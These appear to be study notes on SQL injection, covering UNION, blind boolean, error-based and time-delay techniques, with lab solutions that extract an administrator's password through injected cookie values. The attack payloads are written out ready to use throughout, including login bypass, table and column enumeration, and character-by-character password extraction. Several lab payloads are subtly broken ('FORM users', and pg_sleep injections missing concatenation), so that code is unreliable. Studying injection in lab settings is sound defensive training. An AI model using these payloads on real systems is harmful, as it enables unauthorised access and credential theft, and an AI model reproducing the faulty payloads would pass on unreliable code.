# **SQL injection (SQLi)**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.</span>

- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Allow an attacker to view data that they are not normally able to retrieve.</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Access data that belongs to other users, or any other data that the application can access</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Can modify or delete this data, causing persistent changes to the application's content or behavior.</span>

# **Detecting SQL injection vulnerabilities :**

- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">single quote character </span>`'`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> and look for errors or other anomalies.</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">SQL-specific syntax that evaluates to the base.</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Boolean conditions such as </span>`OR 1=1`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> and </span>`OR 1=2`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">, and look for differences in the application's response</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Payloads designed to trigger time delays when executed within a SQL query.</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query.</span>

# **SQL injection in different parts of the query**

- <span style="font-size: 18px">In </span>`UPDATE`<span style="font-size: 18px"> statements, within the updated values or the </span>`WHERE`<span style="font-size: 18px"> clause.</span>
- <span style="font-size: 18px">In </span>`INSERT`<span style="font-size: 18px"> statements, within the inserted values.</span>
- <span style="font-size: 18px">In </span>`SELECT`<span style="font-size: 18px"> statements, within the table or column name.</span>
- <span style="font-size: 18px">In </span>`SELECT`<span style="font-size: 18px"> statements, within the </span>`ORDER BY`<span style="font-size: 18px"> clause.</span>

# **Retrieving hidden data**

```
Example: https://insecure-website.com/products?category=Gifts
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">This causes the application to make a SQL query to retrieve details of the relevant products from the database:</span>

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">SQL query asks the database to return:</span>

- <span style="font-size: 18px">all details (</span>`*`<span style="font-size: 18px">)</span>
- <span style="font-size: 18px">from the </span>`products`<span style="font-size: 18px"> table</span>
- <span style="font-size: 18px">where the </span>`category`<span style="font-size: 18px"> is </span>`Gifts`
- <span style="font-size: 18px">and </span>`released`<span style="font-size: 18px"> is </span>`1`<span style="font-size: 18px">.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">This means an attacker can construct the following attack, for example:</span>

```
https://insecure-website.com/products?category=Gifts'--
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">This results in the SQL query:</span>

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Note that </span>`--`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> is a comment indicator in SQL.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Attack:</span>

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">This results in the SQL query:</span>

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Warning :</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Take care when injecting the condition </span>`OR 1=1`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an </span>`UPDATE`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> or </span>`DELETE`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> statement, for example, it can result in an accidental loss of data.</span>

# **Subverting application logic**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">SQL query:</span>

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence </span>`--`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> to remove the password check from the </span>`WHERE`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> clause</span>

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">This query returns the user whose </span>`username`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> is </span>`administrator`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> and successfully logs the attacker in as that user.</span>

# **SQL injection UNION attacks**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Use the </span>`UNION`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">The </span>`UNION`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> keyword enables you to execute one or more additional </span>`SELECT`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> queries and append the results to the original query.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">For example:</span>

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">For a </span>`UNION`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> query to work, two key requirements must be met:</span>

- <span style="font-size: 16px">The individual queries must return the same number of columns.</span>
- <span style="font-size: 16px">The data types in each column must be compatible between the individual queries.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements.</span>

# **Determining the number of columns required**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">One method involves injecting a series of </span>`ORDER BY`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> clauses and incrementing the specified column index until an error occurs.</span>

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">The second method involves submitting a series of </span>`UNION SELECT`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> payloads specifying a different number of null values:</span>

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">If the number of nulls does not match the number of columns, the database returns an error,</span>

# **Database-specific syntax**

**<span style="font-size: 17px">Oracle:</span>**

```
' UNION SELECT NULL FROM DUAL--
```

**<span style="font-size: 17px">MySQL:</span>**

```
' UNION SELECT NULL#
```

# **Finding columns with a useful data type**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">A SQL injection UNION attack enables you to retrieve the results from an injected query.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">After you determine the number of required columns, you can probe each column to test whether it can hold string data.You can submit a series of </span>`UNION SELECT`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> payloads that place a string value into each column in turn.</span>

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

# **Using a SQL injection UNION attack to retrieve interesting data**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">The original query returns two columns, both of which can hold string data,The database contains a table called </span>`users`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> with the columns </span>`username`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> and </span>`password`

```
' UNION SELECT username, password FROM users--
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">In order to perform this attack, you need to know that there is a table called </span>`users`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> with two columns called </span>`username`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> and </span>`password`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">.</span>

# **Examining the database in SQL injection attacks**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">To exploit SQL injection vulnerabilities, it's often necessary to find information about the database: </span>

- <span style="font-size: 18px">The type and version of the database software.</span>
- <span style="font-size: 18px">The tables and columns that the database contains</span>

# **Querying the database type and version**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">You can potentially identify both the database type and version by injecting provider-specific queries</span>

<table>
<tbody><tr><td colspan="1" rowspan="1"><p>Database type</p></td><td colspan="1" rowspan="1"><p>Query</p></td></tr><tr><td colspan="1" rowspan="1"><p>Microsoft, MySQL</p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">SELECT @@version</code></p></td></tr><tr><td colspan="1" rowspan="1"><p>Oracle</p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">SELECT * FROM v$version</code></p></td></tr><tr><td colspan="1" rowspan="1"><p>PostgreSQL</p></td><td colspan="1" rowspan="1"><p><code class="hljs" spellcheck="false">SELECT version()</code></p></td></tr></tbody>
</table>

<span style="font-size: 18px">you could use a </span>`UNION`<span style="font-size: 18px"> attack with the following input:</span>

`' UNION SELECT @@version--`

# **Listing the contents of the database**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">you can query </span>`information_schema.tables`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> to list the tables in the database:</span>

```
SELECT * FROM information_schema.tables
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">This returns output like the following:</span>

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">This output indicates that there are three tables, called </span>`Products`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">, </span>`Users`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">, and </span>`Feedback`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">You can then query </span>`information_schema.columns`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> to list the columns in individual tables</span>

```
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">This returns output like the following</span>

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

## **Lab: SQL injection attack, listing the database contents on non-Oracle databases**

<span style="font-size: 18px">Using SQLi ,find out the number and name of tables using information_schema.tables , then using this knowledge access the column name of a particular table that has users_login-data ,column data can be extracted using ,information_schema.columns which will give the names of the columns.</span>

<span style="font-size: 18px">Then access the table column using column names and table names,</span>

<span style="font-size: 18px">Solutions:-</span>

```
' UNION SELECT NULL,NULL--
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE TABLE_NAME='user_xxx'--
' UNION SELECT username,password FROM user_xxx WHERE username = 'administrator'
```

# **What is blind SQL injection?**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.</span>

`UNION`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> attacks are not effective with blind SQL injection vulnerabilities.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Requests to the application include a cookie header like this:</span>

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">When a request containing a </span>`TrackingId`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> cookie is processed, the application uses a SQL query to determine whether this is a known user:</span>

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">suppose that two requests are sent containing the following </span>`TrackingId`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> cookie values in turn:</span>

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- <span style="font-size: 18px">The first of these values causes the query to return results, because the injected </span>`AND '1'='1`<span style="font-size: 18px"> condition is true. As a result, the "Welcome back" message is displayed.</span>
- <span style="font-size: 18px">The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">suppose there is a table called </span>`Users`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> with the columns </span>`Username`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> and </span>`Password`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">, and a user called </span>`Administrator`

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">You can determine the password for this user by sending a series of inputs to test the password one character at a time.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">To do this, start with the following input</span>

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than </span>`m`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">.</span>

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">character of the password is not greater than </span>`t`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">.</span>

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">We can continue this process to systematically determine the full password for the </span>`Administrator`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> user</span>

## **Lab: Blind SQL injection with conditional responses**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Modify the </span>`TrackingId`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> cookie, changing it to:</span>

```
TrackingId=xyz' AND '1'='1
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Verify that the "Welcome back" message appears in the response.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Now change it to:</span>

```
TrackingId=xyz' AND '1'='2
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Verify that the "Welcome back" message does not appear in the response</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Now change it to:</span>

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Verify that the condition is true, confirming that there is a table called </span>`users`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Now change it to:</span>

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Verify that the condition is true, confirming that there is a user called </span>`administrator`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">The next step is to determine how many characters are in the password of the </span>`administrator`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> user</span>

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=1)='a
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Confirming that the password is greater than 1 character in length.Using Intruder on the password Length to check for the length.</span>

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">After determining the length of the password, the next step is to test the character at each position to determine its value,Send the request you are working on to Burp Intruder</span>

# **Error-based SQL injection**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">You may be able to induce the application to return a specific error response based on the result of a boolean expression.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true.</span>

## **Exploiting blind SQL injection by triggering conditional errors**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">To see how this works, suppose that two requests are sent containing the following </span>`TrackingId`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> cookie</span>

```
xyz' AND (SELECT CASE 
                     WHEN (1=2) THEN 1/0 
                     ELSE 'a' 
                  END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">With the first input, the </span>`CASE`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> expression evaluates to </span>`'a'`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">, which does not cause any error</span>
- <span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">With the second input, it evaluates to </span>`1/0`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">, which causes a divide-by-zero error</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Using this technique, you can retrieve data by testing one character at a time:</span>

```
xyz' AND 
(SELECT CASE 
             WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 
             ELSE 'a' 
        END 
FROM Users)='a
```

## **Lab: Blind SQL injection with conditional errors**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Modify the </span>`TrackingId`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> cookie, appending a single quotation mark to it</span>

```
TrackingId=xyz'
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Verify that an error message is received.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Change it to two quotation marks:</span>

```
TrackingId=xyz''
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Verify that the error disappears.</span>

```
TrackingId = xyz' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual ) = 'a' --
```

<span style="font-size: 18px">CASE is the 'IF' , if the Condition is True Then the THEN PART will continue Other wise ELSE part will be continued .</span>

<span style="font-size: 18px">DUAL is a Inbuilt Oracle Table in every Oracle Database.</span> 

```
TrackingId = xyz' AND (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator' ) = 'a' --
```

<span style="font-size: 18px">Checks if the Length of the administrator Password is Greater than 1 if so the ERROR 500 will occcur other wise 200 will be present.</span>

```
 TrackingId = xyz' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator' ) = 'a' --
```

<span style="font-size: 18px">Checks if the first character of the password is 'a' , we will be using intruder to change the value of character to find the first letter and so one the other letter.</span>

## **Extracting sensitive data via verbose SQL error messages**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">You can use the </span>`CAST()`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:</span>

```
CAST((SELECT example_column FROM example_table) AS int)
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">he data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an </span>`int`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">, may cause an error</span>

## **Lab: Visible error-based SQL injection** 

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">The database contains a different table called </span>`users`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">, with columns called </span>`username`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> and </span>`password`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">. To solve the lab, find a way to leak the password for the </span>`administrator`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> user, then log in to their account.</span>

```
TrackingId=laksowlsox2ks'
```

<span style="font-size: 18px">Adding a ' at the end causes an syntax error within the website.</span>

```
TrackingId=laksowlsox2ks'--
```

<span style="font-size: 18px">Adding a Combination of '-- doesn't cause any error.</span>

```
TrackingId=laksowlsox2ks' AND CAST((SELECT 1) AS int) --
```

<span style="font-size: 18px">Using a CAST() Based Boolen Operator to Check for Password using Condition.</span>

<span style="font-size: 18px">The Above Conditions Gives an error due to Boolean Syntax not Complete.</span>

```
TrackingId=laksowlsox2ks' AND 1=CAST((SELECT 1) AS int) --
```

<span style="font-size: 18px">Now as the Boolean Condition is True the Site Loads Perfectly </span>

```
TrackingId=laksowlsox2ks' AND 1=CAST((SELECT username FORM users ) AS int) --
```

<span style="font-size: 18px">Since the line of code is to long it gives an syntax error, therefore we tend to remove the trackingId</span>

```
TrackingId=' AND 1=CAST((SELECT username FORM users ) AS int) --
```

<span style="font-size: 18px">Since there are more than one username in the users database,it gives an syntax error of more then one username.</span>

```
TrackingId=' AND 1=CAST((SELECT username FORM users LIMIT 1 ) AS int) --
```

<span style="font-size: 18px">Since the username is a string variable and not a Int , it cause it to print the error that 'administrator' is not a int variable .</span>

```
 TrackingId=' AND 1=CAST((SELECT password FORM users LIMIT 1 ) AS int) --
```

<span style="font-size: 18px">Using the same principle to can print the password of 'administrator', since the password it not a int variable.</span>

## **<span style="font-size: 22px">Exploiting blind SQL injection by triggering time delays</span>**

<span style="font-size: 19px">If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.</span>

<span style="font-size: 19px">In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:</span>

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Using this technique, we can retrieve data by testing one character at a time:</span>

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

## **Lab: Blind SQL injection with time delays and information retrieval**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">The database contains a different table called </span>`users`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">, with columns called </span>`username`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> and </span>`password`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">. You need to exploit the blind SQL injection vulnerability to find out the password of the </span>`administrator`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> user.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Modify the </span>`TrackingId`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> cookie, changing it to:</span>

```
TrackingId=x'SELECT CASE WHEN(1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Verify that the application takes 10 seconds to respond.</span>

```
TrackingId=x'SELECT CASE WHEN(username ="administrator") THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">Verify that the condition is true, confirming that there is a user called </span>`administrator`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">.</span>

```
TrackingId=x'SELECT CASE WHEN(username ="administrator" AND LENGTH(password)=$1$) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

```
TrackingId=x'SELECT CASE WHEN(username ="administrator" AND SUBSTRING(password,$1$,1)='$a$') THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.</span>

# **SQL injection in different contexts**

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">some websites take input in JSON or XML format and use this to query the database.</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords</span>

<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">the following XML-based SQL injection uses an XML escape sequence to encode the </span>`S`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px"> character in </span>`SELECT`<span style="font-family: Arial, Courier, sans-serif; color: rgb(26, 36, 97); font-size: 18px">:</span>

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

# **Second-order SQL injection**

<span style="font-size: 18px">First-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.</span>

<span style="font-size: 18px">Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.</span>